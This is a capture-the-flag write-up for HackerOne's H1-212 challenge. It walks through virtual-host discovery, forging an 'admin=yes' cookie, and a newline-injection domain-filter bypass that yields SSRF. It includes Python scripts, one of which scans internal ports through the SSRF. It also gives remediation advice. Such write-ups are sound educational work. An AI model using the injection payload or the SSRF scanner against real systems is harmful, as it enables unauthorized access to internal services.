# Write-up [```H1-212```](https://www.hackerone.com/blog/hack-your-way-to-nyc-this-december-for-h1-212)  

## Index

| Title        | Description   |
| ------------- |:-------------|
| [Tools](#general)  | The tools etc. which I used during this CTF |
| [My journey](#my-journey)  | My experience during this CTF |
| [The steps](#the-steps)  | The steps to reproduce |
| [Things learned](#things-learned)  | Summary of things we used/learned in this CTF |
| [Vulnerable code](#vulnerable-code)  | Summary of the vulnerable parts that led to the capture of the flag |
| [Timeline](#timeline)  | Timeline of achievements |

## General  
Tools etc. I used:  
* [Burp Suite](https://portswigger.net/burp)  
* [VMware Virtual Machine](https://www.vmware.com/)
* [Kali Linux](https://www.kali.org/)  
* [virtual-host-discovery](https://github.com/jobertabma/virtual-host-discovery)  
* [NMAP](https://nmap.org/)  
* [Python](https://www.python.org/)  

## My journey 
Alright, cool. Lets start at the beginning of this journey.  

First, when reading trough the [blog post](https://www.hackerone.com/blog/hack-your-way-to-nyc-this-december-for-h1-212) you can read that an engineer launched a new [server](http://104.236.20.43/) which he thinks, can't be hacked. 

So my first thoughts were that it might be something with DNS, since the server itself is 'unhackable' according to the engineer. but since we got the server IP address and not a domain name, this option became invalid.

So I did a quick nmap scan to check for interesting open ports.
```nmap -A 104.236.20.43 -sV -Pn```  
This returned open port ```80(http)``` and ```22(ssh)``` but they didn't look interesting enough to dig deeper.  
So next, I did a simple recon scan with selfmade tools *(that I will publish later this month)*. This scanned the server for other interesting stuff. But like I predicted, it didn't return anything.  
So after that, I took a look at [@Jobertabma's](https://twitter.com/jobertabma) [github](https://github.com/jobertabma/)
where I noticed a tool that matched the blog description; [virtual-host-discovery](https://github.com/jobertabma/virtual-host-discovery).  
After setting up the tool in [Kali](https://www.kali.org/), I fired it up using the following command:  
```ruby scan.rb --ip=104.236.20.43 --host=acme.org```  
The results were:
>Found: admin (200)  
...  
Found: admin.acme.org (200)  
...  

So what now?  
We found a [```Vhost```](https://en.wikipedia.org/wiki/Virtual_hosting), meaning that we should try changing the [```Host Header```](https://stackoverflow.com/questions/43156023/what-is-http-host-header).  
So next, I sent the folowing request:  

>GET / HTTP/1.1  
Host: admin.acme.org  

This gave me the following response:
>HTTP/1.1 200 OK  
Server: Apache/2.4.18 (Ubuntu)  
Set-Cookie: **admin=no**  
Content-Length: 0  
Content-Type: text/html; charset=UTF-8  
 
Awesome, we got a new clue.  
If you look at the response you can see that it sets a cookie ```admin=no```.  
Well.. The first thing we would try is sending this request over but this time with the cookie set to ```admin=yes```.

So i sent the following request:
>GET / HTTP/1.1  
Host: admin.acme.org  
Cookie: **admin=yes**  

Response:
>HTTP/1.1 405 Method Not Allowed  

hmm. *Method Now Allowed*?
Let's change the request type to [```POST```](https://en.wikipedia.org/wiki/POST_(HTTP)).  
Now we got this response:
>HTTP/1.1 406 Not Acceptable  

When we google this error code, the following site pops up:  
* http://www.hostingflow.com/http-error-406-not-acceptable/   
which says:  

```It means that the file exists but the client system did not understand the requested file format. This is because the MIME type specified in the Accept header fails to match with the MIME type specified in the requested file name extension. The browser can only accept data that it knows how to process such as HTML and GIF files. If it is a file that it cannot process such as multimedia file, it will return the 406 error message.```  

```MIME type: A MIME type is a label used to identify a type of data.```  

So it tells us that the server needs to know what type of data it recieves.  
# 
Next I scramled a list of MIME types together, which we will use in a simple python script to check which one the server accepts.  
I created the following script:  
```python
import requests

values = "audio/aac, application/x-abiword, application/octet-stream, video/x-msvideo, application/vnd.amazon.ebook, application/octet-stream, application/x-bzip, application/x-bzip2, application/x-csh, text/css, text/csv, application/msword, application/vnd.ms-fontobject, application/epub+zip, image/gif, text/html, image/x-icon, text/calendar, application/java-archive, image/jpeg, application/javascript, application/json, audio/midi, video/mpeg, application/vnd.apple.installer+xml, application/vnd.oasis.opendocument.presentation, application/vnd.oasis.opendocument.spreadsheet, application/vnd.oasis.opendocument.text, audio/ogg, video/ogg, application/ogg, font/otf, image/png, application/pdf, application/vnd.ms-powerpoint, application/x-rar-compressed, application/rtf, application/x-sh, image/svg+xml, application/x-shockwave-flash, application/x-tar, image/ttf, application/vnd.visio, audio-x-wav, audi/webm, video/webm, image/webp, font/woff, font/woff2, application/xhtml+xml, application/xml, application/zip, video/3gpp, audio/3gpp, application/x-7z-compressed".split(",")

for value in values:
	headers = {"Host":"admin.acme.org", "Accept":value, "Cookie":"admin=yes"}
	r = requests.post("http://104.236.20.43", headers=headers)
	print r.status_code
```   
This basically loops trough the list of MIME types and sends a [```POST```](https://en.wikipedia.org/wiki/POST_(HTTP)) request to the [server](http://104.236.20.43/) with the MIME type in the [```accept header```](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept)

So, let's check the result:  
![](http://poc-server.com/write-ups/h1/MIME_Accept.gif)  
  
All 406. This means we are either doing something wrong, or the right MIME type is not in the list. Well I guessed it was the first option.  
Oke, so which headers can all contain a MIME type?
Uhm, [```Content-Type```](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type)?  
Lets try that.  
So I change this:  
>headers = {"Host":"admin.acme.org", "Accept":value, "Cookie":"admin=yes"}  

To This:  
> headers = {"Host":"admin.acme.org", "Content-Type":value, "Cookie":"admin=yes"}  

Let's try.  
![](http://poc-server.com/write-ups/h1/MIME_Content-Type.gif)  
Notice the 418 status code?  
Well, I did too :stuck_out_tongue:  
>HTTP/1.1 418 I'm a teapot  

Wait, what? Haha
[```418 I'm a teapot```](https://en.wikipedia.org/wiki/Hyper_Text_Coffee_Pot_Control_Protocol)  
So status code 418 is the ```Hyper Text Coffee Pot Control Protocol```  
Well, this doesnt help us since it is just a fun error code, however the body of the response did give us a next clue  

>{"error":{"body":"unable to decode"}}  

Oke, this means we have to send [```JSON```](https://en.wikipedia.org/wiki/JSON) in the [```POST```](https://en.wikipedia.org/wikAi/POST_(HTTP)).  
Let's send an empty JSON object first ```{}```.  
This returns ```{"error":{"domain":"required"}}```  
So next I sent ```{"domain":"https://example.com"}``` which returns ```{"error":{"domain":"incorrect value, .com domain expected"}}```  
Oke, so it wants it to end on .com?  
let's POST ```{"domain":"example.com/.com"}```  
>{"error":{"domain":"incorrect value, sub domain should contain 212"}}  

So we try  
>{"domain":"212@example.com/.com"}  

which returns  
>{"next":"\/read.php?id=1"}  

Oke, nice.
So next we send a [```GET```](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) to ```/read.php?id=1``` containing the ID we just received in the response.  
This gives us the following output: ```{"data":""}```   
So my next thought was that this could be [SSRF](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/).  
Since we know that port 22 is open, let's try to connect to it using the SSRF bug. But first, let's try to bypass the domain filtering.  
What if we try a newline char?  
>{"domain":"212.\nlocalhost:22\n.com"}  

And then do the GET with the given ID:  
>GET /read.php?id=2 HTTP/1.1
Host: admin.acme.org
Cookie: admin=yes

Which gives us:  
>{"data":"U1NILTIuMC1PcGVuU1NIXzcuMnAyIFVidW50dS00dWJ1bnR1Mi4yDQpQcm90b2NvbCBtaXNftYXRjaC4K"}  

Which could be [```base64```](https://en.wikipedia.org/wiki/Base64) decoded to ```SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 Protocol mismatch.```  
Oke, awesome. It is indeed a [SSRF](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/). Now let's try to exploit it.
#  
I created a small python script that automates the process of looping through ports by sending the [```POST```](https://en.wikipedia.org/wikAi/POST_(HTTP)) request with ```localhost:port```, and then use the id in the response to make a [```GET```](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) request to fetch the data, which will then be displayed [```base64```](https://en.wikipedia.org/wiki/Base64) decoded.  

Script:  
```python
import requests, base64, threading, time

port = 0


def scan(port):
	try:
		headers= {"Content-Type":"application/json", "Cookie":"admin=yes", "Host":"admin.acme.org"}
		try:
			p = requests.post("http://104.236.20.43/", json={"domain": "212.\nlocalhost:"+str(port)+"\n.com"}, headers=headers)
			p_json = p.json()
			next = p_json["next"]
		except:
			print "-error on port "+str(port)
	
		next_id = next.split("=")[1]
		g = requests.get("http://104.236.20.43/read.php?id="+str(int(next_id) - 1), headers=headers)
		g_json = g.json()
		try:
			data = g_json["data"]
		except:
			print "-error on port "+str(port)
			data = ""
		if data:
			print str(port) + " - " + base64.b64decode(data)
	except:
		print "-error on port "+str(port)


while port < 2000:
	try:
		thr = threading.Thread(target=scan, args=(port,))
		thr.start()
	except:
		print "-error on port "+str(port)
	time.sleep(0.1)
	port = port + 1
```  
So when we run this script, it checks the ports in the given range. In the scenario above, the range is set to 0-2000.  
Running the script gives us the following result:  
![](http://poc-server.com/write-ups/h1/Port_Scan.gif)  
So port 1337 gives us the message ```Hmm, where would it be?```.
So, where could it be?  
First I didnt get the hint, so I just went on scanning other ports in the hope of finding the next step.  
But after I scanned all ports from 0 to ~65000 I didnt know what to do next, so I messaged [Jobert](https://twitter.com/jobertabma) saying that I needed a hint. He told me that port 1337 is not just a normal port. So I got the hint and quickly went back to ```localhost:1337```, and turned it into ```localhost:1337/flag```.  
This returned the following:  
>FLAG: CF,2dsV\/]fRAYQ.TDEp\`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P\[Y@nka=<tqhnF<aq=K5:BC@Sb*{\[%z"+@yPb/nfFna<e$hv{p8r2\[vMMF52y:z/Dh;{6

So... End of story :)

## The steps
1. Change the [```Host Header```](https://stackoverflow.com/questions/43156023/what-is-http-host-header) to ```admin.acme.org```.
2. Set a [cookie](https://en.wikipedia.org/wiki/HTTP_cookie) in the request with the value of ```admin=yes```.
3. Set the ```Content-Type``` header to ```application/json```.
4. Send a [POST](https://en.wikipedia.org/wikAi/POST_(HTTP)) request with ```{"domain":"212.\nlocalhost:1337/flag\n.com"}```.
5. Decode the [```base64```](https://en.wikipedia.org/wiki/Base64) encoded data.

## Things learned
* How to read; Reading the [blog](https://www.hackerone.com/blog/hack-your-way-to-nyc-this-december-for-h1-212) and the [tweet](https://twitter.com/jobertabma/status/930113142763302913blog) mulitple times gives away a lot of info. So make sure you understand what it says, and why.  
* Exploiting a [```Vhost```](https://en.wikipedia.org/wiki/Virtual_hosting) on a server  
* What ```405 Method Not Allowed``` means and how we can *'fix'* it  
* What ```406 Not Acceptable``` means and how we can *'fix'* it  
* The april fools joke; ```418 I'm a teapot```  
* How to use [SSRF](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/) to scan the internal network for open ports  
* That python can automate and speed up things. (imagine I had to sent a POST and GET request 65 thousand times by hand...)  
* That H1 CTF's are fun :stuck_out_tongue:  

## Vulnerable code  
These are some of the things that could have prevented all of this.  
* Since the domain in the JSON post could contain internal IP address, we could fetch internal data. This could have been prevented by a black list or by implementing something like [this](https://github.com/jtdowney/private_address_check)  
* Instead of using a [cookie](https://en.wikipedia.org/wiki/HTTP_cookie) that contains if a user is admininistrator or not, there coud have been a session [cookie](https://en.wikipedia.org/wiki/HTTP_cookie) that checks [server side](https://en.wikipedia.org/wiki/Server-side) if a user is admininistrator or not.  

## Timeline  
* [Nov 14 07:30 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - I found the admin.acme.org virtual host. 
* [Nov 14 11:40 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - I found out that the server was accepting JSON .  
* [Nov 15 08:32 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - I found the SSRF vulnerability. 
* [Nov 15 09:16 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - I found a bypass for the domain restriction. 
* [Nov 15 09:48 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - I discovered the open port 1337. 
* [Nov 15 10:48 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - I found the flag.  
* [Nov 16 4:00 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - Started the write up process  
* [Nov 18 11:58 PM](https://www.timeanddate.com/worldclock/netherlands/amsterdam) - Sent in the write up   


## The end  
Thanks for reading this far.  
I hope you learned something from it, but more importantly; I hope you enjoyed it.  
# 
*Created by [H1 - 003random](http://hackerone.com/003random) - [@003random](https://twitter.com/rub003)*
